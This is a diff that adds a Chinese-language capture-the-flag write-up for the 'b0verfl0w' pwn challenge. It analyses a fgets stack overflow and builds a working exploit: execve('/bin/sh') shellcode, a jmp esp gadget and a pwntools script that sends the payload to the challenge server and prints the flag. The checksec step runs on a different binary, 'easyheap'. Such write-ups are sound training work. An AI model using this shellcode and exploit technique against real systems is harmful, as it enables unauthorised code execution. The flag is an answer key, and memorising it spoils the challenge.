@@ -2370,6 +2370,148 @@ io.interactive()
 
 ------
 
+### [b0verfl0w](https://ce.pwnthebox.com/challenges?type=4&id=1642)
+
+先`file ./b0verfl0w `查看文件类型，再`checksec --file=./b0verfl0w `检查一下文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ file ./b0verfl0w          
+./b0verfl0w: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9f2d9dc0c9cc531c9656e6e84359398dd765b684, not stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ checksec --file=./easyheap 
+[*] '/home/tyd/ctf/pwn/pwnthebox/easyheap'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+```
+
+使用`IDA pro 32bit`打开附件`b0verfl0w`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  return vul();
+}
+```
+
+双击`vul()`函数继续审计源码，该函数中有个局部变量`s`是`char`型数组，`s`的长度是`32`字节，可用栈大小为`0x38`字节。`fgets()`函数读取输入到变量`s`时限制输入的大小为`50`字节，显然存在栈溢出漏洞。
+
+```c
+int vul()
+{
+  char s[32]; // [esp+18h] [ebp-20h] BYREF
+
+  puts("\n======================");
+  puts("\nWelcome to X-CTF 2016!");
+  puts("\n======================");
+  puts("What's your name?");
+  fflush(stdout);
+  fgets(s, 50, stdin);
+  printf("Hello %s.", s);
+  fflush(stdout);
+  return 1;
+}
+```
+
+`fgets()`只能输入`50`个字节，其中`padding`占了`0x20`个字节，`fake ebp`还需要`0x4`个字节覆盖到栈帧底部，`ret`还需要`0x4`个字节，实际剩下的就只有`0xa`个字节。我们可以这样来构造栈，在栈的初始位置写入一段`shellcode`，然后最后`0xa`个字节让程序跳转到栈的起始处执行`shellcode`。
+
+![](https://paper.tanyaodan.com/PwnTheBox/1642/1.jpg)
+
+注意到`Functions window`中有个`hint`函数，其汇编代码如下，可以看到`jmp esp`的地址是`0x8048504`，这就不需要用`ROPgadget`来获取`jmp esp`的地址啦。当`ret`指令是从段间转移的`call`指令进入的子程序中返回时，会修改`eip`和`esp`寄存器。所以当`ret`的地址被赋值为`0x8048504`时就会执行`jmp esp`，此时`esp = esp + 4`，`esp`寄存器指向`sub esp, 0x28; jmp esp`，同时`esp`寄存器中的数据出栈赋值给`eip`寄存器，`eip`寄存器也指向`sub esp, 0x28; jmp esp`，这样就可以劫持`esp`寄存器指向`shellcode`处，程序继续执行`jmp esp`，就会跳转到栈的起始处执行`shellcode`。
+
+```assembly
+.text:080484FD                 public hint
+.text:080484FD hint            proc near
+.text:080484FD ; __unwind {
+.text:080484FD                 push    ebp
+.text:080484FE                 mov     ebp, esp
+.text:08048500                 sub     esp, 24h
+.text:08048503                 retn
+.text:08048503 hint            endp ; sp-analysis failed
+.text:08048503
+.text:08048504 ; ---------------------------------------------------------------------------
+.text:08048504                 jmp     esp
+.text:08048506 ; ---------------------------------------------------------------------------
+.text:08048506                 retn
+.text:08048507 ; ---------------------------------------------------------------------------
+.text:08048507                 mov     eax, 1
+.text:0804850C                 pop     ebp
+.text:0804850D                 retn
+.text:0804850D ; } // starts at 80484FD
+```
+
+编写`shellcode`来获取`system("/bin/sh")`以操控靶机。
+
+```assembly
+xor eax, eax    ; clear eax
+xor edx, edx    ; clear edx
+push edx        ; 将0入栈 标记了'/bin/sh'的结尾
+push 0x68732f2f ; 将'/sh'的地址入栈 为了4字节对齐 传递的是'//sh', 这在execve()中等同于'/sh'
+push 0x6e69622f ; 将'/bin'的地址入栈
+mov ebx, esp    ; 此时esp指向'/bin/sh' 通过esp将字符串赋值给ebx
+xor ecx, ecx    ; clear ecx
+mov al, 0xb     ; eax置为execve()函数的中断号
+int 0x80        ; 调用syscall()函数软中断
+```
+
+编写`shellcode`来获取`system("/bin/sh")`汇编代码所对应的机器码，一共有三种写法。
+
+```python
+shellcode = '''
+xor eax, eax
+xor edx, edx
+push edx
+push 0x68732f2f
+push 0x6e69622f
+mov ebx, esp
+xor ecx, ecx
+mov al, 0xb
+int 0x80
+'''
+shellcode = asm(shellcode) # len(shellcode) = 23
+# 以上代码等价于下面这行 不过下面这行更简洁 len(shellcode) = 21
+shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
+
+shellcode = asm(shellcraft.sh()) # 一般情况下不用 太长啦 len(shellcode) = 44
+```
+
+编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10461`，发送`payload`即可得到`PTB{986eef70-9609-4709-b34a-e07257c82b53}`，提交即可。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('redirect.do-not-trust.hacking.run', 10461)
+
+shellcode = '''
+xor eax, eax
+xor edx, edx
+push edx
+push 0x68732f2f
+push 0x6e69622f
+mov ebx, esp
+xor ecx, ecx
+mov al, 0xb
+int 0x80
+'''
+shellcode = asm(shellcode)
+# shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
+
+jmp_esp = 0x8048504
+sub_esp_jmp = asm('sub esp, 0x28; jmp esp')
+payload = shellcode + (0x20-len(shellcode)+4)*b'a' + p32(jmp_esp) + sub_esp_jmp
+
+io.sendlineafter("What's your name?", payload)
+io.interactive()
+```
+
+------
+
 ## Pwnable.kr
 
 ### fd
